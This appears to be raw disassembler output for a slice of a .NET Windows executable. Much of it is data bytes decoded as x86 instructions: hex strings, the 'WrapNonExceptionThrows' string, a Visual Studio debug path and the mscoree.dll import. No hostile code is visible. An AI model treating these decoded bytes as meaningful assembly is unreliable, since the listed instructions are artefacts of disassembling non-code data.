  40a74c:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  40a750:	xor    esi,DWORD PTR [ebx]
  40a752:	xor    eax,0x65663039
  40a757:	data16 cmp BYTE PTR [ecx+0x64],ah
  40a75b:	xor    eax,0x63333463
  40a760:	bound  esp,QWORD PTR [ecx+0x38]
  40a763:	xor    dh,BYTE PTR [edx]
  40a765:	cmp    DWORD PTR [eax],esi
  40a767:	arpl   WORD PTR fs:[ecx+edi*1],si
  40a76b:	xor    eax,0x66653033
  40a770:	data16 cmp BYTE PTR fs:[esi],dh
  40a774:	xor    eax,0x39643332
  40a779:	xor    al,0x38
  40a77b:	xor    esp,DWORD PTR [ebx+0x30]
  40a77e:	xor    BYTE PTR [esi+0x34],ah
  40a781:	xor    eax,0x34666138
  40a786:	cmp    BYTE PTR ss:[ecx],bh
  40a789:	xor    BYTE PTR [eax],dh
  40a78b:	xor    esi,DWORD PTR [esi]
  40a78d:	bound  esi,QWORD PTR [eax]
  40a78f:	xor    ah,BYTE PTR gs:[ebx+0x36]
  40a793:	xor    DWORD PTR [eax+esi*1+0x37],esp
  40a797:	aaa    
  40a798:	fs aaa 
  40a79a:	bound  sp,DWORD PTR [ecx+0x63]
  40a79e:	xor    al,0x36
  40a7a0:	aaa    
  40a7a1:	popa   
  40a7a2:	xor    eax,0x62653630
  40a7a7:	popa   
  40a7a8:	xor    bh,BYTE PTR [ecx]
  40a7aa:	gs xor al,0x36
  40a7ad:	aaa    
  40a7ae:	popa   
  40a7af:	cmp    BYTE PTR [edi],dh
  40a7b1:	xor    DWORD PTR [ecx],edi
  40a7b3:	cmp    BYTE PTR [edx+0x30],ah
  40a7b6:	xor    eax,0x34376333
  40a7bb:	cmp    DWORD PTR [ecx+0x61],esp
  40a7be:	xor    ah,BYTE PTR [ecx+0x34]
  40a7c1:	xor    bh,BYTE PTR fs:[eax]
  40a7c4:	xor    al,0x30
  40a7c6:	arpl   WORD PTR [edi],si
  40a7c8:	cmp    BYTE PTR [eiz*2+0x6436],dh
  40a7cf:	push   ds
  40a7d0:	add    DWORD PTR [eax],eax
  40a7d2:	add    DWORD PTR [eax],eax
  40a7d4:	push   esp
  40a7d5:	add    dl,BYTE PTR [esi]
  40a7d7:	push   edi
  40a7d8:	jb     0x40a83b
  40a7da:	jo     0x40a82a
  40a7dc:	outs   dx,DWORD PTR ds:[esi]
  40a7dd:	outs   dx,BYTE PTR ds:[esi]
  40a7de:	inc    ebp
  40a7df:	js     0x40a844
  40a7e1:	gs jo  0x40a858
  40a7e4:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40a7eb:	ja     0x40a860
  40a7ed:	add    DWORD PTR [eax],ecx
  40a7ef:	add    DWORD PTR [eax],eax
  40a7f1:	or     BYTE PTR [eax],al
	...
  40a7fb:	add    dl,ah
  40a7fd:	ficom  WORD PTR [ecx]
  40a7ff:	push   eax
  40a800:	add    BYTE PTR [eax],al
  40a802:	add    BYTE PTR [eax],al
  40a804:	add    al,BYTE PTR [eax]
  40a806:	add    BYTE PTR [eax],al
  40a808:	sbb    al,0x1
  40a80a:	add    BYTE PTR [eax],al
  40a80c:	adc    al,0xa8
  40a80e:	add    BYTE PTR [eax],al
  40a810:	adc    al,0x8a
  40a812:	add    BYTE PTR [eax],al
  40a814:	push   edx
  40a815:	push   ebx
  40a816:	inc    esp
  40a817:	push   ebx
  40a818:	aas    
  40a819:	push   0xffffffbe
  40a81b:	test   DWORD PTR ds:0xbd4cec04,0x9fa9e116
  40a825:	call   0x0:0x1d878
  40a82c:	data16 cmp bl,BYTE PTR [edx+eiz*2+0x69]
  40a831:	outs   dx,BYTE PTR ds:[esi]
  40a832:	popa   
  40a833:	jb     0x40a89e
  40a835:	gs jae 0x40a894
  40a838:	dec    ecx
  40a839:	outs   dx,BYTE PTR ds:[esi]
  40a83a:	je     0x40a8a1
  40a83c:	jb     0x40a8ab
  40a83e:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x6f435c65
  40a847:	outs   dx,BYTE PTR ds:[esi]
  40a848:	arpl   WORD PTR [ebp+0x72],si
  40a84b:	jb     0x40a8b2
  40a84d:	outs   dx,BYTE PTR ds:[esi]
  40a84e:	arpl   WORD PTR [ecx+0x56],di
  40a851:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  40a858:	gs jb  0x40a8b7
  40a85b:	jb     0x40a8be
  40a85d:	jp     0x40a8d9
  40a85f:	ins    BYTE PTR es:[edi],dx
  40a860:	gs arpl WORD PTR cs:[edi+0x6c],bp
  40a865:	ins    BYTE PTR es:[edi],dx
  40a866:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a86b:	outs   dx,BYTE PTR ds:[esi]
  40a86c:	arpl   WORD PTR [ebp+0x64],bp
  40a86f:	arpl   WORD PTR cs:[ebx+0x70],si
  40a873:	jb     0x40a8e4
  40a875:	push   0x5f
  40a877:	xor    eax,0x39383338
  40a87c:	xor    dh,BYTE PTR [eax]
  40a87e:	xor    dh,BYTE PTR [ebx]
  40a880:	pop    esp
  40a881:	outs   dx,DWORD PTR ds:[esi]
  40a882:	bound  ebp,QWORD PTR [edx+0x72]
  40a885:	pop    esp
  40a886:	js     0x40a8c0
  40a888:	ss pop esp
  40a88a:	inc    ebx
  40a88b:	jbe    0x40a8d0
  40a88d:	outs   dx,DWORD PTR ds:[esi]
  40a88e:	ins    BYTE PTR es:[edi],dx
  40a88f:	ins    BYTE PTR es:[edi],dx
  40a890:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a895:	outs   dx,BYTE PTR ds:[esi]
  40a896:	inc    ebx
  40a897:	ins    DWORD PTR es:[edi],dx
  40a898:	fs cs jo 0x40a900
  40a89c:	bound  eax,QWORD PTR [eax]
	...
  40a92e:	add    BYTE PTR [eax],al
  40a930:	pop    eax
  40a931:	test   eax,0x0
  40a936:	add    BYTE PTR [eax],al
  40a938:	add    BYTE PTR [eax],al
  40a93a:	add    BYTE PTR [eax],al
  40a93c:	outs   dx,BYTE PTR ds:[esi]
  40a93d:	test   eax,0x20000000
	...
  40a956:	add    BYTE PTR [eax],al
  40a958:	pusha  
  40a959:	test   eax,0x0
  40a95e:	add    BYTE PTR [eax],al
  40a960:	add    BYTE PTR [eax],al
  40a962:	pop    edi
  40a963:	inc    ebx
  40a964:	outs   dx,DWORD PTR ds:[esi]
  40a965:	jb     0x40a9ac
  40a967:	js     0x40a9ce
  40a969:	dec    ebp
  40a96a:	popa   
  40a96b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  40a972:	jb     0x40a9d9
  40a974:	gs cs fs ins BYTE PTR es:[edi],dx
  40a978:	ins    BYTE PTR es:[edi],dx
  40a979:	add    BYTE PTR [eax],al
  40a97b:	add    BYTE PTR [eax],al
  40a97d:	add    bh,bh
  40a97f:	and    eax,0x402000
